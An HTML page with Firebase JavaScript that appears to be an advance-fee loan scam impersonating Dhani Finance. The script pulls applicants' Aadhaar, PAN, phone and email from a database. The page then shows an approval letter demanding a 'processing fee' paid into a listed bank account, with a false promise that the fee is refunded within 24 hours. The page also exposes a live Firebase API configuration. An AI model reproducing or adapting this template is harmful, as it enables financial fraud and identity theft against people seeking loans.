<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>Dhani Loan Approval — Document</title>
<style>
:root{
  --accent:#2563eb;
  --green:#10b981;
  --bg:#fffdf2;
  --card-bg:#fff9e6;
  --note-red:#dc2626;
  --text-dark:#333;
}

body{
  margin:0;
  padding:0;
  font-family:Arial,sans-serif;
  background:var(--bg);
  color:var(--text-dark);
}

.a4-page{
  width:210mm;  
  min-height:297mm; 
  margin:20px auto;
  padding:20mm;
  background:var(--card-bg);
  box-sizing:border-box;
  box-shadow:0 0 8px rgba(0,0,0,0.1);
  position:relative;
}

h1.title{
  text-align:center;
  color:var(--accent);
  margin-bottom:20px;
  font-size:26px;
}

.helpline{
  position:absolute;
  top:20mm;
  right:20mm;
  font-size:14px;
  font-weight:700;
  color:#000;
}

.section{
  margin-bottom:20px;
}

.label-value{
  font-size:16px;
  margin-bottom:10px;
}

.label-value span{
  font-weight:700;
}

.name-line{
  display:flex;
  justify-content:space-between;
  align-items:center;
}

.approval-message{
  background:#fffcef;
  padding:16px;
  border-radius:8px;
  line-height:1.6;
  font-size:15px;
  white-space:pre-line;
}

.note, .pay-account{
  color:var(--note-red);
  font-weight:700;
  line-height:1.5;
}

@media(max-width:768px){
  .a4-page{
    width:95%;
    min-height:auto;
    padding:15px;
  }
  h1.title{font-size:22px;}
  .label-value{font-size:14px;}
  .approval-message{font-size:14px;}
  .name-line{flex-direction:column; align-items:flex-start;}
  .name-line .appid{margin-top:5px;}
  .helpline{position:static; margin-bottom:10px;}
}
</style>
</head>
<body>

<div class="a4-page">
  <h1 class="title">Dhani Finance Pvt. Ltd.</h1>

  <!-- Helpline number top right -->
  <div class="helpline" id="helplineNumber"></div>

  <div class="section">
    <!-- Name on left, Application ID fully right -->
    <div class="label-value name-line">
      <div>Name – <span id="display_name"></span></div>
      <div class="appid">Application ID – <span id="display_appId"></span></div>
    </div>
    <!-- Aadhaar below Name -->
    <div class="label-value">Aadhaar – <span id="display_aadhaar"></span></div>
    <div class="label-value">Email – <span id="display_email"></span></div>
    <div class="label-value">Mobile – <span id="display_mobile"></span></div>
    <div class="label-value">PAN – <span id="display_pan"></span></div>
    <div class="label-value">Loan Amount – <span id="display_amount"></span></div>
  </div>

  <div class="section approval-message" id="approvalMessage"></div>
</div>

<script src="https://www.gstatic.com/firebasejs/10.12.0/firebase-app-compat.js"></script>
<script src="https://www.gstatic.com/firebasejs/10.12.0/firebase-database-compat.js"></script>
<script src="https://www.gstatic.com/firebasejs/10.12.0/firebase-auth-compat.js"></script>

<script>
  const firebaseConfig = {
    apiKey: "AIzaSyCsIYVX3OawpDlFZpKU3KpRsfM7QQoyWyY",
    authDomain: "onlineservice-9f153.firebaseapp.com",
    databaseURL: "https://onlineservice-9f153-default-rtdb.firebaseio.com",
    projectId: "onlineservice-9f153",
    storageBucket: "onlineservice-9f153.appspot.com",
    messagingSenderId: "1040271430967",
    appId: "1:1040271430967:web:6325b056257454943d36b2"
  };

  firebase.initializeApp(firebaseConfig);
  const db = firebase.database();
  
const auth=firebase.auth();
const $=id=>document.getElementById(id);

auth.signInAnonymously();

auth.onAuthStateChanged(user=>{
  if(!user) return;
  const aadhaar=localStorage.getItem("loan_aadhaar");
  if(!aadhaar) return;

  // Fetch helpline number from admin node
  db.ref("admin/helpline").once("value").then(snap=>{
    if(snap.exists()) $("helplineNumber").textContent = "Helpline: " + snap.val();
  });

  db.ref("loanUsers/"+aadhaar).once("value").then(snap=>{
    if(!snap.exists()) return;
    const d = snap.val();

    $("display_name").textContent = d.name || "—";
    $("display_appId").textContent = d.applicationId || "—";
    $("display_aadhaar").textContent = d.aadhaar || "—";
    $("display_email").textContent = d.email || "—";
    $("display_mobile").textContent = d.mobile || "—";
    $("display_pan").textContent = d.pan || "—";
    $("display_amount").textContent = "₹"+(d.amount||0).toLocaleString("en-IN");

    if(d.status==="Approved"){
      const dateStr = new Date().toLocaleDateString("en-IN");
      $("approvalMessage").innerHTML = 
`Respected Sir/Mam,
We are very glad to inform you that in response to your request for a loan in order to meet your financial needs. At the outset we welcome you to meet of Dhani Finance Pvt.Ltd..

You requested a short term loan, Sum of loan amount INR ${d.amount.toLocaleString("en-IN")}/- for the tenure of ${d.tenure||"00"} Years, ${d.tenureMonths||"60"} Months on dated ${dateStr}. Your monthly EMI is INR ${d.emi||"N/A"}/- at the rate of ${d.interestRate||5}% including the rate of interest.

When you submit amount of File Processing Fee legal consideration charge fee INR ${d.processingFee||2250}/-. After that it is our responsibility to hand over your approved loan value of INR ${d.amount.toLocaleString("en-IN")}/- in your bank account after verify your credit ability.
Please continue your loan application without hesitation.

General Loans
Processing fee Legal Consideration INR ${d.processingFee||2250}/-

<div class="pay-account">
Pay at This Account
Name - Dhani Finance Limited
A/c No. ${d.adminAccount||"918961830603"}
IFSC Code - ${d.adminIFSC||"AIRP0000001"}
</div>

<div class="note">
Note:-
1. We do not accept cash deposit.
2. We accept only NEFT/IMPS/Mobile Banking/Net Banking/Other
3. Processing fee will be refundable within 24 hours.
</div>`;
    } else {
      $("approvalMessage").textContent = "Your loan status is pending. Please wait for approval.";
    }
  });
});
</script>

</body>
</html>
